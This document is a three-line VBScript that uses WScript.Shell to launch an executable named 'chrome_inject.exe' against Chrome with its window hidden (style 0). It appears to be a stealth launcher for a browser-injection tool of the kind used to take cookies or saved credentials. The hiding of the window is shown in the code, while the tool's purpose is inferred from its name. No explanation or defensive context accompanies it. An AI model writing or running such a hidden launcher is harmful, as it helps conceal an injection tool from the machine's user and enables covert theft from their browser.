Set WshShell = CreateObject("WScript.Shell") 
WshShell.Run chr(34) & "chrome_inject.exe" & Chr(34) & " chrome --start-browser", 0
Set WshShell = Nothing
